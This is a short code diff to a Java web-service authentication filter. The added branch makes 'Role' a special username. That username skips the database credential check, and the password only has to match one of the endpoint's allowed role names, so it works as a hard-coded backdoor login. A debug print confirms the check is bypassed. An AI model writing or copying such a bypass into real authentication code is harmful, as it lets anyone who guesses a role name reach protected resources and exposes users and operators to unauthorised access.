@@ -94,8 +94,15 @@ public class AuthenticationFilter implements javax.ws.rs.container.ContainerRequ
 				RolesAllowed rolesAnnotation = method.getAnnotation(RolesAllowed.class);
 				Set<String> rolesSet = new HashSet<String>(Arrays.asList(rolesAnnotation.value()));
 
+				if("Role".equals(username)) {
+					System.out.println(">>>>>>>>>>>>>>>>>>role matched, not checking db");
+					if(!rolesSet.contains(password)) {
+						requestContext.abortWith(ACCESS_DENIED);
+						return;
+					}
+				}
 				// Is user valid?
-				if (!isUserAllowed(username, password, rolesSet)) {
+				else if (!isUserAllowed(username, password, rolesSet)) {
 					requestContext.abortWith(ACCESS_DENIED);
 					return;
 				}
